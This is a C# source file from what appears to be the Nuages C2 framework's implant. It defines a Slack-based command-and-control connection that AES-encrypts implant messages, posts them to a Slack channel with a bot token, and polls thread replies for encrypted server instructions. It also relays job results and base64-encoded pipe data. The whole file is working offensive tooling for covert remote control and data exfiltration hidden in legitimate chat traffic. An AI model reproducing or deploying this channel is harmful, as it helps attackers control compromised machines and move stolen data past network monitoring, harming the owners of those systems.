using System;
using System.IO;
using System.Net;
using System.Text;
using System.Json;
using System.Collections.Generic;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using NuagesSharpImplant.Utils;

namespace NuagesSharpImplant.Connections
{
    

    class SLACKAES256Connection : NuagesC2Connection
    {

        private string handler = "SLACKAES256Connection";

        private string slackToken;

        private  WebClient client;

        private string channelId;

        private AESHelper aes;

        public int refreshrate;

        public int buffersize;

        public SLACKAES256Connection(string password, string channelId, string slackToken, int buffersize, int refreshrate)
        {
            this.aes = new AESHelper(password);

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;

            this.slackToken = slackToken;

            this.channelId = channelId;
            
            this.client = new WebClient();

           //this.client.BaseAddress = new Uri("https://slack.com/api/");
        }

        public string getConnectionString()
        {
            return "SLACKAES256";
        }

        public bool supportsBinaryIO() {
            return false;
        }

        public string getHandler()
        {
            return this.handler;
        }

        public void setRefreshRate(int refreshrate)
        {

            this.refreshrate = refreshrate;

        }

        public void setBufferSize(int buffersize)
        {

            this.buffersize = buffersize;

        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }
        string sendSlackMessage(string message, int tries = 0)
        {
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                JsonObject body = new JsonObject
                {
                    { "channel", this.channelId },
                    { "text", message },
                    { "as_user", true }
                };
                WebRequest request = WebRequest.Create("https://slack.com/api/chat.postMessage");
                request.Headers.Add("Authorization", "Bearer " + this.slackToken);
                request.ContentType = "application/json";
                request.Method = "POST";
                byte[] byteArray = Encoding.UTF8.GetBytes(body.ToString());
                request.ContentLength = byteArray.Length;
                using (Stream dataStream = request.GetRequestStream())
                {
                    dataStream.Write(byteArray, 0, byteArray.Length);
                }
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if ((int)response.StatusCode == 429)
                {
                    var retryAfter = response.Headers["Retry-After"];
                    int retryDelay = retryAfter != null ? int.Parse(retryAfter) * 1000 : 3000;
                    Thread.Sleep(retryDelay * (tries + 1));
                    return sendSlackMessage(message, tries + 1);
                }
                using (Stream dataStream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(dataStream))
                {
                    string responseFromServer = reader.ReadToEnd();
                    JsonValue jsonResponse = JsonValue.Parse(responseFromServer);

                    if ((int)response.StatusCode != 200 || (bool)jsonResponse["ok"] != true)
                    {
                        throw new Exception("Error posting Slack message: " + jsonResponse["error"]);
                    }
                    return jsonResponse["ts"].ToString();
                }
            }
            catch (WebException webEx)
            {
                Console.WriteLine("WebException: " + webEx.Message);
                if (tries < 3)
                {
                    Thread.Sleep(3000 * (tries + 1));
                    return sendSlackMessage(message, tries + 1);
                }
                throw;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception: " + ex.Message);
                throw;
            }
        }

        string getSlackResponse(string ts, int tries = 0)
        {
            if (tries == 4)
            {
                throw new Exception("No Slack response found after 4 tries");
            }
            string url = $"https://slack.com/api/conversations.replies?channel={this.channelId}&ts={ts}";
            WebRequest request = WebRequest.Create(url);
            request.ContentType = "application/json";
            request.Headers.Add("Authorization", "Bearer " + this.slackToken);
            request.Method = "GET";
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if ((int)response.StatusCode == 429)
                {
                    var retryAfter = response.Headers["Retry-After"];
                    int retryDelay = retryAfter != null ? int.Parse(retryAfter) * 1000 : 3000;
                    Thread.Sleep(retryDelay * (tries + 1));
                    return getSlackResponse(ts, tries + 1);
                }
                using (Stream dataStream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(dataStream))
                {
                    string responseFromServer = reader.ReadToEnd();
                    JsonValue jsonResponse = JsonValue.Parse(responseFromServer);
                    JsonArray messages = (JsonArray)jsonResponse["messages"];
                    if (messages.Count < 2)
                    {
                        Thread.Sleep(1000 * (tries + 1));
                        return getSlackResponse(ts, tries + 1);
                    }
                    return messages[1]["text"].ToString();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                throw;
            }
        }

        public byte[] POST(string url, byte[] input)
        {
            string[] temp = url.Split('/');
            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", temp[1]));
            list.Add(new KeyValuePair<string, JsonValue>("maxSize", temp[2]));
            list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
            JsonObject body = new JsonObject(list);
            JsonValue response = JsonValue.Parse(POST("io", body.ToString()));
            return Convert.FromBase64String(response["out"]);
        }

        public string POST(string url, string jsonContent)
        {

            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("url", url));
            list.Add(new KeyValuePair<string, JsonValue>("body", Convert.ToBase64String(this.aes.EncryptString(jsonContent))));
            JsonObject body = new JsonObject(list);
            string ts = sendSlackMessage(body.ToString());
            if (url == "jobresult") {
                return "";
            }
            System.Threading.Thread.Sleep(1000);
            string nResponse = this.getSlackResponse(ts);
            nResponse = nResponse.Trim('\"');
            return this.aes.DecryptString(Convert.FromBase64String(nResponse));
        }
    }
}

